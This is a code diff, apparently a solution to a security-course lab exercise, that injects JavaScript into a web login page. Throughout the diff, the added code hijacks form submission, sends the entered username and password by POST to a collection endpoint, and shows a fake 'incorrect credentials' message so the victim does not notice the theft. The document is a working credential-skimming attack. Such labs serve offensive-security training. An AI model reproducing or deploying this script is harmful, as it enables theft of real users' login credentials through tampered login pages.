@@ -112,6 +112,10 @@ function getCredential() {
     let user = document.getElementById("LoginUserUsername").value;
     let pass = document.getElementById("LoginUserPassword").value;
 
+    if (user === "" || pass === "") {
+        return
+    }
+
     fetch(api_credential, {
         body: "user=" + encodeURIComponent(user) + "&pass=" + encodeURIComponent(pass),
         headers: {
@@ -119,4 +123,26 @@ function getCredential() {
         },
         method: "POST"
     })
+}
+
+// Ex 10.6.5.2 - Extra Mile: capture login events
+let form = document.getElementById("login-form")
+form.onsubmit = function(e) {
+    e.preventDefault()
+    getCredential();
+
+    // fake incorrect credentials to mimic real login page
+    if(!document.getElementById("flashMessage")) {
+        var incorrect_password = document.createElement('div');
+        incorrect_password.id="flashMessage";
+        incorrect_password.className += "alert auto-hide alert-danger";
+        incorrect_password.textContent="Email and password do not match any user in our database."
+        document.getElementsByClassName("login-alert")[0].appendChild(incorrect_password);
+        document.getElementById("LoginUserUsername").value = '';
+        document.getElementById("LoginUserPassword").value = '';
+    }
+    else {
+        document.getElementById("LoginUserUsername").value = '';
+        document.getElementById("LoginUserPassword").value = '';
+    }
 }
